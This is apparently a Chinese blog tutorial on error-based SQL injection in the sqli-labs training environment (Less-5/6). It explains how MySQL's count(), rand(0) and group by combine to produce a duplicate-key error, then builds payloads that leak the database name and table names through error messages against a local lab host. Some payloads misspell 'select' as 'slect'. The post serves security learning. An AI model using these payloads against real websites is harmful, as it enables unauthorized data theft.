---
layout: post
title: SQL 注入（九） 报错注入专题
desc: ""
keywords: ""
date: 2016-11-04
categories: []
tags: []
---

<blockquote>
  简直悲壮 = =
</blockquote>

<h2>Less-5 &amp; Less-6</h2>

<h3>Count()</h3>

<pre class="lang:tsql decode:true" title="count()">select count(*) from information_schema.tables;</pre>

该函数将会返回information_schema.tables表的行数，属于聚合函数

<h3>Rand()</h3>

<pre class="lang:tsql decode:true" title="rand()">select rand()</pre>

该函数返回一个介于0和1之间的随机数，注意rand()和rand(0)不同，传入的参数称为随机数种子，如果有这个种子，每次生成的结果都是<strong>固定的</strong>

rand(0)的三次实验

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand0_1.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand0_2.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand0_3.png" />

rand()的三次实验

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand1_1.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand1_2.png" />

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_test_rand1_3.png" />

<h3>Group by</h3>

group by是根据by后面的规则，将数据进行分组，分组即根据一个数据集划分为若干个小区域，然后针对若干个小区域分别进行数据处理（分类汇总）

例如 <code>select type, sum(number) as total from A group by type</code> 会统计每一种type的数量，然后返回一个表来展示每一种type的数量（即total）

group by 函数一般会和聚合函数一起使用

如果不与聚合函数一起使用，比如以下语句<code>select table_name, table_schema from information_schema.tables group by table_schema</code> 将会根据table_schema的首字母排序，输出每个数据库里第一个表的名字（只有第一个了）

<h3>Group_concat()</h3>

group_concat()函数会将数值相同的字段打印在一行，用逗号分割

<h3>注入整体分析</h3>

~~终于明白了~~

如果要分析他为何报错，我们要先来看以下几个内容：
1. select count(&#42;) from table group by x; 这个语句执行的原理
2. rand() 函数作为 group by 参数执行时的特性
3. select count(&#42;) from table group by floor(rand(0)&#42;2)报错的完整分析

<h4>select count(&#42;) from table group by x 执行原理</h4>

这个语句的意思就是将整组数据按照x这一条件分类，将每一类分别统计数量。当Mysql遇到该语句时会建立一个空的虚拟表用于统计，如下图所示：

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_table_groupby.png" />

左边是真实的表，我们要统计这个表中name相同的元素的数量，使用语句
select count(&#42;) from table group by name

这时候Mysql会先建立一个虚拟表如右图，key和value为表头，其中key对应的是name不同的值，而value则为具体的统计数量。Time是为了方便说明加入的计次

当检索第一条数据时，虚拟表中没有a这个值，因此这个值的数量1(value)将会被记录下来，这个值a(key)也会被记录下来；

当检索第二条数据时，同理，记录下了b的value和b的key；

...

当检索到第五条时，发现虚拟表中已经存在了key为d的条目，于是将对应的value增加1

<h4>rand() 函数作为 group by 参数执行时的特性</h4>

Mysql官方给过提示，当rand()函数与group by一起使用时，rand()将被执行多次，“多次”的含义是：如果虚拟表中不存在对应记录，则在讲rand()插入虚拟表时会再执行一次。

我们已经知道了在多次查询中，floor(rand(0)&#42;2)的值是固定的，为 0,1,1,0,1,1,...

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_table_error.png" />

当执行语句的时候，先会计算一次floor(rand(0)&#42;2)，这个值是0，我们的语句就变成了 select count(&#42;) from table group by 0; 以此检索第一条数据， 此时虚拟表不存在key为0的记录，我们将其value记为1，插入到虚拟表。但由于虚拟表没有这条记录，在记录key的值的时候，floor(rand(0)&#42;2)又计算了一次，值现在为1，我们实际记录的是(1:1)

接着检索第二条数据，再次计算floor(rand(0)&#42;2)，值为1，我们的虚拟表中已经存在这个结果，于是将value由1变成2

下面是检索第三条数据，floor(rand(0)&#42;2)的计算结果为0，我们的虚拟表中不存在这个结果，将value记为1，而在插入key的值的时候，又会计算一次floor(rand(0)&#42;2)，这时候key的值变成了1，于是我们得到了一条记录(1:1)，这时候键就重复了，有两个key为1的记录，于是报错

我们也可以看到，这个方法只有在表中<strong>大于三条数据</strong>的时候才能成功。

<h3>Payload</h3>

<pre class="lang:tsql decode:true " title="payload">' and (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,
floor(rand(0)*2))name from information_schema.tables group by name) --+</pre>

&nbsp;

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_payload_1.png" />
此时提示Operand should contain 1 column(s)，原因是这里只能输出1个字段，但我们的语句输出了多个字段，因此只要加上一个select 1即可，将payload改为：

<pre class="lang:tsql decode:true" title="payload">' and (slect 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,
floor(rand(0)*2))name from information_schema.tables group by name)) --+</pre>

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_payload_2.png" />

这时候提示我们Every derived table must have its own alias，意思是每一个派生出来的表必须有一个自己的别名，我们进行嵌套查询的时候需要将子查询的结果作为一个派生表进行上一级的查询，因此必须有一个别名。将payload继续改进：

<pre class="lang:tsql decode:true " title="database">' and (slect 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,
floor(rand(0)*2))name from information_schema.tables group by name)x) --+</pre>

<img src="http://oc42vgpoj.bkt.clouddn.com/less5_payload_3.png" />

<pre class="lang:tsql decode:true " title="table_name">http://192.168.137.128/sqli/Less-5/?id=1' and (select 1 from (select count(*),
concat(0x3a,0x3a,(select table_name from information_schema.tables limit 1,1),
0x3a,0x3a,floor(rand(0)*2))name from information_schema.tables group by name)x) --+
</pre>